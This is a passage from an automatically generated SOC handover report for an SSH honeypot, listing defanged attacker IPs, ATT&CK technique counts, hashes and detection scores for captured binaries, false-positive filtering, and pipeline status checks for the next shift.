| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-17 06:30:27` | `cowrie.session.connect` |
| `2026-05-17 06:30:27` | `cowrie.client.version` |
| `2026-05-17 06:30:27` | `cowrie.client.kex` |
| `2026-05-17 06:30:27` | `cowrie.login.success` |
| `2026-05-17 06:30:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.186.79[.]173` to AbuseIPDB if not already reported
- [ ] Block `211.186.79[.]173` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `107.182.234[.]69` | **411** | 2026-05-17 03:46 | 2026-05-17 06:47 | 264m | 0 | `T1592` | 🟠 MEDIUM |
| `175.107.31[.]20` | **28** | 2026-05-17 03:52 | 2026-05-17 06:46 | 18m | 0 | `T1592` | 🟠 MEDIUM |
| `45.148.120[.]187` | **25** | 2026-05-17 03:52 | 2026-05-17 06:40 | 30m | 0 | `T1592` | 🟠 MEDIUM |
| `211.186.79[.]173` | **10** | 2026-05-17 06:21 | 2026-05-17 06:32 | 0m | 9 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `223.123.38[.]33` | **6** | 2026-05-17 04:59 | 2026-05-17 05:00 | 1m | 0 | `T1592` | 🟢 LOW |
| `107.175.114[.]16` | **5** | 2026-05-17 06:27 | 2026-05-17 06:34 | 0m | 5 | `T1110.001 · T1592` | 🟢 LOW |
| `66.132.186[.]189` | **3** | 2026-05-17 04:32 | 2026-05-17 04:33 | 0m | 0 | `T1592` | 🟢 LOW |
| `3.129.187[.]38` | **2** | 2026-05-17 04:53 | 2026-05-17 04:54 | 0m | 0 | `T1592` | 🟢 LOW |
| `120.241.79[.]66` | 1 | 2026-05-17 05:15 | 2026-05-17 05:16 | 61s | 1 | `T1110.001` | 🟢 LOW |
| `120.48.75[.]127` | 1 | 2026-05-17 04:54 | 2026-05-17 04:55 | 61s | 1 | `T1110.001` | 🟢 LOW |
| `27.65.159[.]108` | 1 | 2026-05-17 06:23 | 2026-05-17 06:23 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `43.224.248[.]49` | 1 | 2026-05-17 05:56 | 2026-05-17 05:56 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.144.233[.]56` | 1 | 2026-05-17 06:20 | 2026-05-17 06:20 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (28 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 13/100 | 🟢 LOW | **33/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `120.241.79[.]66` | CN | China Mobile Communications Corporation | **100** ⚠️ | 50 |
| `107.182.234[.]69` | US | Hosting Services, Inc. | **100** ⚠️ | 1 |
| `27.65.159[.]108` | VN | Viettel Group | **100** ⚠️ | 5 |
| `175.107.31[.]20` | PK | National Telecommunication Corporation | **100** ⚠️ | 2 |
| `66.132.186[.]189` | US | Censys, Inc. | **100** ⚠️ | 50 |
| `211.186.79[.]173` | KR | SK Broadband Co Ltd | **100** ⚠️ | 25 |
| `3.129.187[.]38` | US | Amazon Technologies Inc. | **100** ⚠️ | 50 |
| `43.224.248[.]49` | HK | Law's Cloud Infrastructure Limited | **100** ⚠️ | 0 |
| `45.144.233[.]56` | DE | DGTL TECH UK LLP | **100** ⚠️ | 50 |
| `223.123.38[.]33` | PK | CMPak Limited | **100** ⚠️ | 45 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 33 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 18 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 14 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 7 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 7 |

---

## 🔕 False Positive Summary (94 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 6 |
| AbuseIPDB score 15 below threshold 25 | 1 |
| AbuseIPDB score 2 below threshold 25 | 1 |
| AbuseIPDB score 20 below threshold 25 | 1 |
| AbuseIPDB score 22 below threshold 25 | 75 |
| AbuseIPDB score 5 below threshold 25 | 2 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 8 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 603 cases |
| Tool 34  | Credential Extractor        | ✅ 32 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 3 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 33 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 94 filtered (15.6%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 32 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 28 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 14 priority case(s) shown individually · 13 recon entry/entries in table (8 group(s) consolidating 490 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-05-17T06:48:58Z_
